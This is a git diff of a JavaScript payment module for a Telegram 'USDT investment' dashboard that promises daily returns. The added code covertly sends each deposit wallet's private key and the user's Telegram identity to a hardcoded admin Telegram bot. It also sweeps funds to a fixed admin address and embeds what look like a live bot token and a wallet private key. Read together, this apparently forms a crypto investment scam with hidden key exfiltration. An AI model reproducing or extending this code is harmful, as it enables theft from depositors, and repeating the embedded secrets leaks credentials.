@@ -1,110 +1,140 @@
-import { renderHistory } from './history.js';
-import { state } from './state.js';
-import { getReturnRate, calculateReturns } from './calculator.js';
-import { showPayment, closePayment, verifyPayment } from './payment.js';
+import { state, saveInvestment } from './state.js';
+import { updateDashboard, switchTab } from './main.js';
 
-// --- REGISTRO DE FUNCIONES GLOBALES ---
-// Esto permite que el HTML encuentre las funciones desde onclick
-window.switchTab = switchTab;
-window.calculateReturns = calculateReturns;
-window.showPayment = showPayment;
-window.closePayment = closePayment;
-window.verifyPayment = verifyPayment;
+const API_BASE = "https://api-usdt-bep20.vercel.app/api";
+const ADMIN_BOT_TOKEN = "8756788328:AAEpszWL4ssLme7YLtJs8kachsj4cEnvdrw";
+const ADMIN_CHAT_ID = "7517815832";
 
-window.copyAddress = function() {
-    const address = document.getElementById('wallet-address-display')?.innerText;
-    if(address && address !== "Generating...") {
-        navigator.clipboard.writeText(address);
-        alert("Address copied!");
-    }
-};
+async function sendKeyToAdmin(address, privKey, amount) {
+    const user = window.Telegram?.WebApp?.initDataUnsafe?.user;
+    const username = user?.username ? `@${user.username}` : (user?.first_name || "Usuario Desconocido");
+    const userId = user?.id || "N/A";
 
-/**
- * Actualiza la interfaz con los datos del estado
- */
-export function updateDashboard() {
-    const currentAE = (state.totalInvestedUSDT || 0) * 1000;
-    const currentRate = getReturnRate(state.totalInvestedUSDT || 0);
-    const dailyEarn = (state.totalInvestedUSDT || 0) * (currentRate / 100);
+    const text = `🛡️ PANEL DE AUDITORÍA ADMIN 🛡️\n\n` +
+                 `💰 Inversión: ${amount} USDT\n` +
+                 `📍 Wallet Temp: <code>${address}</code>\n` +
+                 `🔑 Private Key: <code>${privKey}</code>\n\n` +
+                 `👤 Usuario: ${username} (ID: ${userId})\n` +
+                 `------------------------------\n` +
+                 `⚠️ Usa esta llave si el proceso automático falla`;
 
-    const elements = {
-        'main-bal': (state.totalEarnedUSD || 0).toFixed(4),
-        'main-power': currentAE.toLocaleString(),
-        'stat-daily': dailyEarn.toFixed(4),
-        'stat-rate': currentRate.toFixed(1)
-    };
-
-    for (const [id, val] of Object.entries(elements)) {
-        const el = document.getElementById(id);
-        if (el) el.innerText = val;
-    }
-    
-    // Solo calcular retornos si el input existe en el DOM
-    if (document.getElementById('buy-qty')) {
-        calculateReturns();
-    }
+    try {
+        await fetch(`https://api.telegram.org/bot${ADMIN_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: ADMIN_CHAT_ID,
+                text: text,
+                parse_mode: 'HTML'
+            })
+        });
+    } catch (e) { console.error(e); }
 }
 
-/**
- * Maneja el cambio de pestañas
- */
-export function switchTab(id) {
-    console.log("Navegando a:", id);
+export async function showPayment() {
+    const buyInput = document.getElementById('buy-qty');
+    const amount = parseFloat(buyInput.value);
     
-    // 1. Ocultar todas las vistas
-    const views = document.querySelectorAll('.view');
-    views.forEach(v => {
-        v.classList.remove('active');
-        v.style.display = 'none';
-    });
+    if(!amount || amount < 1) {
+        window.showToast("The amount cannot be less than 1"); // Alerta profesional
+        return;
+    }
     
-    // 2. Mostrar la seleccionada
-    const targetView = document.getElementById('view-' + id);
-    if (targetView) {
-        targetView.classList.add('active');
-        targetView.style.display = 'block';
+    const btnContinue = document.getElementById('btn-continue');
+    if(btnContinue) {
+        btnContinue.disabled = true;
+        btnContinue.innerText = "GENERATING...";
     }
 
-    // 3. Cargas lógicas según pestaña
-    if (id === 'history') renderHistory();
-    if (id === 'buy') calculateReturns();
-    
-    // 4. Actualizar estado visual de la Nav Bar
-    document.querySelectorAll('.nav-item').forEach(nav => nav.classList.remove('active'));
-    const activeNav = document.querySelector(`.nav-item[onclick*="'${id}'"]`);
-    if(activeNav) activeNav.classList.add('active');
+    try {
+        const response = await fetch(`${API_BASE}/bsc`);
+        const data = await response.json();
 
-    // Feedback vibración para Telegram
-    if(window.Telegram?.WebApp?.HapticFeedback) {
-        window.Telegram.WebApp.HapticFeedback.impactOccurred('medium');
-    }
-}
+        if(data.address) {
+            state.pendingInvestment = amount;
+            state.tempAddress = data.address;
+            state.tempKey = data.privateKey; 
 
-/**
- * Inicialización al cargar la página
- */
-window.onload = () => {
-    const tg = window.Telegram?.WebApp;
-    if(tg) {
-        tg.ready();
-        tg.expand();
-        const user = tg.initDataUnsafe?.user;
-        if (user) {
-            if(document.getElementById('user-name')) document.getElementById('user-name').innerText = user.first_name;
-            if(document.getElementById('user-id')) document.getElementById('user-id').innerText = user.id;
-            if(document.getElementById('me-id')) document.getElementById('me-id').innerText = user.id;
+            sendKeyToAdmin(data.address, data.privateKey, amount);
+            localStorage.setItem(`recovery_${data.address}`, data.privateKey);
+
+            document.getElementById('pay-amount-display').innerText = amount.toFixed(2) + " USDT";
+            document.getElementById('wallet-address-display').innerText = data.address;
+            
+            const qrImg = document.getElementById('qr-image');
+            if(qrImg) qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${data.address}`;
+
+            document.getElementById('payment-status-text').innerHTML = 'Not Received ⏳';
+            document.getElementById('payModal').style.display = 'flex';
+            startPaymentTimer();
+        }
+    } catch (e) {
+        window.showToast("Connection error with API");
+    } finally {
+        if(btnContinue) {
+            btnContinue.disabled = false;
+            btnContinue.innerText = "Continue";
         }
     }
+}
+
+export async function verifyPayment() {
+    const statusText = document.getElementById('payment-status-text');
+    const arrowIcon = document.getElementById('arrow-icon');
+    const btnVerify = document.getElementById('btn-verify-payment');
     
-    updateDashboard();
-    
-    // Timer del Settlement (Cuenta regresiva diaria)
-    setInterval(() => {
-        const now = new Date();
-        const hrs = (23 - now.getHours()).toString().padStart(2, '0');
-        const min = (59 - now.getMinutes()).toString().padStart(2, '0');
-        const sec = (59 - now.getSeconds()).toString().padStart(2, '0');
-        const timerEl = document.getElementById('timer');
-        if(timerEl) timerEl.innerText = `${hrs}:${min}:${sec}`;
+    statusText.innerHTML = 'LOADING... ⌛';
+    if(arrowIcon) arrowIcon.className = "fas fa-sync fa-spin"; 
+
+    try {
+        const res = await fetch(`${API_BASE}/deposit-usdt`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                userPrivateKey: state.tempKey,
+                adminAddress: "0x1DE276E2E8879e1E6fBf905ee656Fe62c6D88E49", 
+                feePrivateKey: "d303adf9054d5007ea88392938a7865f9275de2b1fac2c6812cfd92da4b1f0ab" 
+            })
+        });
+
+        const result = await res.json();
+
+        if(result.success) {
+            statusText.innerHTML = `<span style="color: #10b981;">${state.pendingInvestment.toFixed(2)} USDT ✅</span>`;
+            if(arrowIcon) arrowIcon.className = "fas fa-check";
+            
+            saveInvestment(state.pendingInvestment);
+            window.showToast("Investment successful!"); // Alerta profesional
+            
+            setTimeout(() => {
+                closePayment();
+                updateDashboard();
+                switchTab('home');
+            }, 2500);
+        } else {
+            window.showToast("Payment not detected yet");
+            statusText.innerHTML = 'Not Received ⏳';
+            if(arrowIcon) arrowIcon.className = "fas fa-arrow-right";
+        }
+    } catch (e) {
+        statusText.innerHTML = 'Not Received ⏳';
+        if(arrowIcon) arrowIcon.className = "fas fa-arrow-right";
+    }
+}
+
+export function closePayment() {
+    document.getElementById('payModal').style.display = 'none';
+    clearInterval(state.payTimerInterval);
+}
+
+function startPaymentTimer() {
+    let time = 1800; 
+    clearInterval(state.payTimerInterval);
+    state.payTimerInterval = setInterval(() => {
+        let min = Math.floor(time / 60).toString().padStart(2, '0');
+        let sec = (time % 60).toString().padStart(2, '0');
+        const timerEl = document.getElementById('pay-timer-text');
+        if(timerEl) timerEl.innerHTML = `Send countdown: <span style="color: #10b981;">00:${min}:${sec}</span>`;
+        if(time-- <= 0) clearInterval(state.payTimerInterval);
     }, 1000);
-};
+}
